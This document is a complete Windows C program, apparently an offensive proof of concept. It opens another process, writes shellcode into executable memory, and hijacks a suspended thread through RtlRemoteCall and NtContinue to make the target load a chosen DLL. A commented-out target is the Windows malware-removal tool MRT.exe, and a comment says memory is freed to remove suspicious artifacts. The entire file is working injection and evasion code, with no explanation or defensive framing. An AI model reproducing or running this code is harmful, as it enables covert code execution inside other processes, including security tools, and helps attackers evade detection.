#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>

#define TARGET_LIB "C:\\Windows\\System32\\WindowsCodecsRaw.dll"

#define RETVAL_TAG 0xDDCCBBAA

typedef NTSTATUS(NTAPI* RtlRemoteCall_t)(HANDLE Process, HANDLE Thread, PVOID CallSite, ULONG ArgumentCount, PULONG Arguments, BOOLEAN PassContext, BOOLEAN	AlreadySuspended);
typedef NTSTATUS(NTAPI* NtContinue_t)(PCONTEXT ThreadContext, BOOLEAN	RaiseAlert);
typedef HANDLE(WINAPI* OpenProcess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR lpLibFileName);

int FindTarget(const char* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}


int FindThreadID(int pid) {

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while (Thread32Next(Snap, &thEntry)) {
        if (thEntry.th32OwnerProcessID == pid) {
            tid = thEntry.th32ThreadID;
            break;
        }
    }
    CloseHandle(Snap);

    return tid;
}

typedef struct _ApiReeKall {
	// remote API call return value
	size_t		retval;

	// standard function to call at the end of the shellcode
	NtContinue_t ntContinue;
	CONTEXT		context;

	// remote function to call - adjust the types!
	LoadLibraryA_t ARK_func;
	char		param1[100];				// LPCSTR
}ApiReeKall;

void SHELLCODE(ApiReeKall* ark) {
	size_t ret = (size_t)ark->ARK_func(ark->param1);
	ark->retval = ret;
	ark->ntContinue(&ark->context, 0);
}
void SHELLCODE_END(void) {}


size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
	char prolog[] = { 0x49, 0x8b, 0xcc,   // mov rcx, r12
						0x49, 0x8b, 0xd5,	// mov rdx, r13
						0x4d, 0x8b, 0xc6,	// mov r8, r14
						0x4d, 0x8b, 0xcf	// mov r9, r15
	};
	int prolog_size = sizeof(prolog);

	// resolve needed API pointers
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlRemoteCall");
	NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");

	if (pRtlRemoteCall == NULL || pNtContinue == NULL) {
		printf("[!] Error resolving native API calls!\n");
		return -1;
	}

	// allocate some space in the target for our shellcode
	void* remote_mem = VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) {
		printf("[!] Error allocating remote memory!\n");
		return -1;
	}
	printf("[+] Allocated memory = 0x%p\n", remote_mem);

	// calculate the size of our shellcode
	size_t sc_size = (size_t)SHELLCODE_END - (size_t)SHELLCODE;

	size_t bOut = 0;
#ifdef _WIN64 
	// first, write prolog, if the process is 64-bit
	if (WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T*)&bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (prolog)!\n");
		return -1;
	}
#else
	// otherwise, ignore the prolog
	prolog_size = 0;
#endif
	// write the main payload
	if (WriteProcessMemory(hProcess, (char*)remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T*)&bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (shellcode)!\n");
		return -1;
	}

	// set remaining data in ApiReeKall struct - NtContinue with a thread context we're hijacking
	ark.retval = RETVAL_TAG;
	ark.ntContinue = pNtContinue;
	ark.context.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);
	GetThreadContext(hThread, &ark.context);

	// prepare an argument to be passed to our shellcode
	ApiReeKall* ark_arg;
	ark_arg = (ApiReeKall*)((size_t)remote_mem + sc_size);
	if (WriteProcessMemory(hProcess, ark_arg, &ark, sizeof(ApiReeKall), 0) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		ResumeThread(hThread);
		printf("[!] Error writing remote memory (ApiReeKall arg)!\n");
		return -1;
	}

	printf("[+] ark_arg = %#zx\n", ark_arg);

	// if all is set, make a remote call
	printf("[+] All set!\n"); getchar();
	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG)&ark_arg, 1, 1);

	printf("[+] RtlRemoteCall result: %#x\n", status);
	ResumeThread(hThread);

	// get the remote API call return value
	size_t ret = 0;
	while (TRUE) {
		ReadProcessMemory(hProcess, ark_arg, &ret, sizeof(size_t), (SIZE_T*)&bOut);
		if (ret != RETVAL_TAG) break;
		Sleep(1000);
	}

	// dealloc the shellcode memory to remove suspicious artifacts
	if (!VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE))
		printf("[!] Remote shellcode memory (@%p) could not be released (error code = %x)\n", GetLastError());

	return ret;
}

int main() {

	DWORD dwPid = 0x00, dwTid = 0x00;
	HANDLE hProcess = NULL, hThread = NULL;

	dwPid = 6468;


	/*
	dwPid = FindTarget("MRT.exe");
	if (dwPid == 0x00) {
		printf("[!] Could not find target process! Is it running?\n");
		return -1;
	}
	*/

	dwTid = FindThreadID(dwPid);
	if (dwTid == 0x00) {
		printf("[!] Could not find a thread in target process!\n");
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
	hThread = OpenThread(THREAD_ALL_ACCESS, 0, dwTid);
	if (hProcess == NULL || hThread == NULL) {
		printf("[!] Error opening remote process and thread!\n");
		return -1;
	}

	ApiReeKall ark = { 0 };
	ark.ARK_func = (LoadLibraryA_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	strcpy_s(ark.param1, 100, TARGET_LIB);

	SIZE_T ret = MakeReeKall(hProcess, hThread, ark);

	printf("[+] Remote API call return value = %#zx\n", ret);
	printf("[+] Press <ENTER> to exit\n");
	getchar();

	// cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}